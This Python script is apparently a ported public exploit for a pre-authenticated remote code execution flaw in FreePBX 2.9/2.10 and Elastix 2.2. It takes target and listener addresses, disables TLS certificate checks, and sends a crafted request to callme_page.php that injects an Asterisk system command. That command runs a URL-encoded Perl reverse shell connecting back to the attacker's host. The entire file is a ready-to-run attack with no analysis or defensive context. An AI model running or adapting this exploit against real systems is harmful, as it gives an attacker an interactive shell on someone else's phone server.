import urllib.request
import ssl
import argparse

print("######################################################################################")
print("# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit   #")
print("# Date: March 23rd, 2012                                                             #")
print("# Author: muts, SSL update by Emporeo                                                #")
print("# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.                    #")
print("# Edited by: b1ner0ne                                                                #")
print("# Language: Python3                                                                  #")
print("# Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/  #")
print("######################################################################################")


parser = argparse.ArgumentParser()
parser._optionals.title = "OPTIONS"
parser.add_argument('-rhost', help='Remote host', dest='rhost', type=str, required=True)
parser.add_argument('-lhost', help='Local host', dest='lhost', type=str, required=True)
parser.add_argument('-lport', help='Local port', dest='lport', type=str, required=True)
parser.add_argument('-e', dest='Extension (default: 233)')
args = parser.parse_args()

rhost = args.rhost
lhost = args.lhost
lport = args.lport
extension = "233"


# Necessary setting to avoid errors with SSL
ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Reverse shell payload
url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib.request.urlopen(url,context=ctx)
